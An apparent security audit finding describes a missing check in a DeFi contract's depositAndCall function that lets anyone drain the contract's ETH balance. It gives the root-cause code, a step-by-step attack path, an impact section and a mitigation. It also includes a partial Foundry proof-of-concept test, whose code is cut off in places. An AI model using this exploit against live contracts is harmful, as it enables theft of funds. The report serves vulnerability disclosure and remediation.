# Missing Checks When `asset=ETH` Allows Anyone to Drain GatewaySend's ETH Balance

### Summary

The `depositAndCall` function in `GatewaySend` incorrectly uses the `outputAmount` from an ERC20 token swap as `msg.value` when the target `asset` for the cross-chain operation is specified as native ETH. This occurs without verifying that the initial user funds were ETH or that the contract actually received ETH from the swap to cover this `value`. This will cause a complete loss of any ETH held by the `GatewaySend`, as an attacker will craft a transaction providing an ERC20 token, specifying ETH as the desired output `asset` for the cross-chain call, and tricking the contract into using its own pre-existing ETH balance to fund the `value` of the `gateway.depositAndCall` invocation to ZetaChain's gateway.

### Root Cause

In `GatewaySend`, within the first `depositAndCall` function ([lines 222-266](https://github.com/pyk/dodocc-fuzz/blob/b27cae8d8d449e39b1f234a005f4091c600db0a2/src/GatewaySend.sol#L222C1-L266C1)), if the `asset` parameter is `_ETH_ADDRESS_`, the function proceeds to call `_handleETHDeposit`. 

```solidity
function depositAndCall(
    address fromToken,
    uint256 amount,
    bytes calldata swapData,
    address targetContract,
    address asset,
    uint32 dstChainId,
    bytes calldata payload
) public payable {
    // ...
    bool toIsETH = (asset == _ETH_ADDRESS_);
    if (toIsETH) {
        _handleETHDeposit(targetContract, outputAmount, message, revertOptions);
    } else {
        _handleERC20Deposit(targetContract, outputAmount, asset, message, revertOptions);
    }
    // ...
}
```


Inside `_handleETHDeposit` ([lines 176-183](https://github.com/pyk/dodocc-fuzz/blob/b27cae8d8d449e39b1f234a005f4091c600db0a2/src/GatewaySend.sol#L176-L183)), the `outputAmount` parameter  is directly used as `msg.value` for the `gateway.depositAndCall{ value: amount }` call. 

```solidity
function _handleETHDeposit(
    address targetContract,
    uint256 amount,
    bytes memory message,
    RevertOptions memory revertOptions
) internal {
    gateway.depositAndCall{ value: amount }(targetContract, message, revertOptions);
}
```

The critical flaw is the missing check to ensure that this ETH `value` is sourced from the current transaction's `msg.value`  or from ETH explicitly obtained from the DODO swap (e.g., unwrapped WETH). Instead, it uses the contract's own ETH balance if the user initially sent an ERC20.

### Internal Pre-conditions

The `GatewaySend` contract must have an ETH balance greater than 0. 

This can occur if:

- ETH is directly sent to the contract's address via its `receive()` or `fallback()` functions.
- A previous legitimate `depositAndCall` where `fromToken` was ETH had `msg.value` greater than the specified `amount` for the swap, leaving residual ETH.
- A previous DODO swap within `depositAndCall` (where `fromToken` was ETH) did not consume the full `msg.value` if DODO's `fromTokenAmount` was less.
- An ETH refund to the `GatewaySend` contract via its `onRevert` function failed to subsequently be transferred out to the original sender (due to sender revert or gas issues).

### External Pre-conditions

1. Attacker held ERC20 that have liquidity

### Attack Path

1.  **Pre-condition:** `GatewaySend` contract has an ETH balance of `X > 0`.
2.  **Attacker approves `GatewaySendProxy` to spend USDC.**
3.  **Attacker calls `GatewaySend.depositAndCall` with the following parameters:**
    *   `fromToken`: `USDC` address.
    *   `amount`: `0.0001 * 1e6`.
    *   `swapData`: Crafted DODO `mixSwap` parameters for a USDC -> SHIB swap.
        *   `params.fromToken`: `USDC`
        *   `params.toToken`: `SHIB`
        *   `params.fromTokenAmount`: `0.0001 * 1e6`.
    *   `targetContract`: Address of a contract on ZetaChain.
    *   `asset`: `0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE`.
    *   `dstChainId`: A valid destination chain ID.
    *   `payload`: Arbitrary or empty.
    *   `msg.value`: `0`.
4.  **`GatewaySend.depositAndCall` execution:**
    *   The contract transfers `amount` USDC from Attacker to itself.
    *   `_doMixSwap(swapData)` is called. The DODO router is approved for `params.fromTokenAmount` USDC. The DODO swap occurs, and suppose `_doMixSwap` returns `outputAmount = 1e18`.
    *   Since `asset` is ETH, `toIsETH` becomes true.
    *   `_handleETHDeposit(targetContract, outputAmount, message, revertOptions)` is called with `outputAmount = 1e18`.
    *   Inside `_handleETHDeposit`, `gateway.depositAndCall{ value: amount }(...)` is called, where `amount` is `1e18`.
    *   **Crucially, the `GatewaySend` contract attempts to send `1e18` wei as `msg.value` to the ZetaChain `gateway` contract.**
5.  **Result:** The attacker has successfully used their USDC deposit to trigger the contract to spend its own ETH for the cross-chain operation.

### Impact

The `GatewaySend` contract suffers a direct loss of its ETH holdings. The attacker can drain up to the total ETH balance of the `GatewaySend` contract. The attacker gains this ETH value as part of the cross-chain message sent to ZetaChain, in exchange for the ERC20 tokens they initially deposited and used in the DODO swap. This can lead to a complete drain of all ETH accumulated in the `GatewaySend` contract.

        uint256 fromTokenAmount;
        address toToken;

        uint256 minReturnAmount;

        bytes payload;
        address asset;
    }

    function setUp() external {
        uint256 mainnetFork = vm.createFork("https://eth.merkle.io", 22_630_175);
        vm.selectFork(mainnetFork);

        // Deploy GatewaySend
        gatewaySend = deployGatewaySend();

    function deployGatewaySend() internal returns (GatewaySend send) {
        GatewaySend imlementation = new GatewaySend();
        vm.label(address(imlementation), "GatewaySendImplementation");

        uint256 gasLimit = 0;
        bytes memory data =
            abi.encodeWithSelector(GatewaySend.initialize.selector, gatewayEVM, dodoRouteProxy, dodoApprove, gasLimit);
        ERC1967Proxy proxy = new ERC1967Proxy(address(imlementation), data);
        send = GatewaySend(payable(address(proxy)));
        vm.label(address(proxy), "GatewaySendProxy");
    }

    function createSwapData(
        Vars memory s
    ) internal view returns (bytes memory swapData) {
        return encodeCompressedMixSwapParams({
            fromToken: s.fromToken,
            toToken: s.toToken,
            fromTokenAmount: s.fromTokenAmount,
            expReturnAmount: s.expReturnAmount,
            minReturnAmount: s.minReturnAmount,
            mixAdapters: new address[](0),
            mixPairs: new address[](0),
            assetTo: new address[](0),
            directions: 0,
            moreInfo: new bytes[](0),
            feeData: bytes(""),
            deadline: block.timestamp + 1 hours
        });
    }

    function encodeCompressedMixSwapParams(
        address fromToken,
        address toToken,
        uint256 fromTokenAmount,
        uint256 expReturnAmount,
        uint256 minReturnAmount,
        address[] memory mixAdapters,
        address[] memory mixPairs,
        address[] memory assetTo,
        uint256 directions,
        bytes[] memory moreInfo,
        bytes memory feeData,
        uint256 deadline
    ) internal pure returns (bytes memory) {
        bytes memory encoded = abi.encodePacked(
            fromToken, toToken, fromTokenAmount, expReturnAmount, minReturnAmount, directions, deadline
        );

        encoded = bytes.concat(
            encoded,
            encodeAddressArray(mixAdapters),
            encodeAddressArray(mixPairs),
            encodeAddressArray(assetTo),
            encodeBytesArrayWithLens(moreInfo),
            encodeBytesWith2Len(feeData)
        );

        return encoded;
    }

    function encodeAddressArray(
        address[] memory arr
    ) internal pure returns (bytes memory out) {
        require(arr.length <= 255, "Too many addresses");
        out = abi.encodePacked(uint8(arr.length));
        for (uint256 i = 0; i < arr.length; i++) {
            out = bytes.concat(out, abi.encodePacked(arr[i]));
        }
    }

    function encodeBytesWith2Len(
        bytes memory data
    ) internal pure returns (bytes memory out) {
        require(data.length <= 65_535, "Too long");
        out = abi.encodePacked(uint16(data.length), data);
    }

    function encodeBytesArrayWithLens(
        bytes[] memory arr
    ) internal pure returns (bytes memory out) {
        require(arr.length <= 255, "Too many items");
        out = abi.encodePacked(uint8(arr.length));
        for (uint256 i = 0; i < arr.length; i++) {
            require(arr[i].length <= 65_535, "Item too long");
            out = bytes.concat(out, abi.encodePacked(uint16(arr[i].length)));
        }
        for (uint256 i = 0; i < arr.length; i++) {
            out = bytes.concat(out, arr[i]);
        }
    }

    function testPOC() external {
        logState("1) Initial state");

        IERC20(usdc).approve(address(gatewaySend), type(uint256).max);

        logState("2) User approve USDC");

        Vars memory vars;
        vars.fromToken = usdc;
        vars.toToken = shib;
        vars.fromTokenAmount = 0.0001 * 1e6;
        vars.expReturnAmount = 0;
        vars.minReturnAmount = 0;
        vars.dstChainId = 8453;
        vars.asset = ETH;

        bytes memory swapData = createSwapData(vars);

        logState("3) User craft swapData");

        gatewaySend.depositAndCall({
            fromToken: vars.fromToken,
            amount: vars.fromTokenAmount,
            swapData: swapData,
            targetContract: gatewayTransferNative,
            asset: vars.asset,
            dstChainId: vars.dstChainId,
            payload: vars.payload
        });

        logState("4) ETH Balance Drained");
    }

    function logState(
        string memory state
    ) internal view {
        console.log("====== %s ======", state);
        console.log("GatewaySend ETH balance", address(gatewaySend).balance);
        console.log("User USDC balance", IERC20(usdc).balanceOf(address(this)));
    }
}

### Mitigation

In `GatewaySend.depositAndCall`: When the target asset for the cross-chain call is specified as native ETH, the contract must ensure that the ETH being sent as `msg.value` to `gateway.depositAndCall` is sourced appropriately from the current transaction, not from the contract's pre-existing ETH balance if the user provided ERC20s.
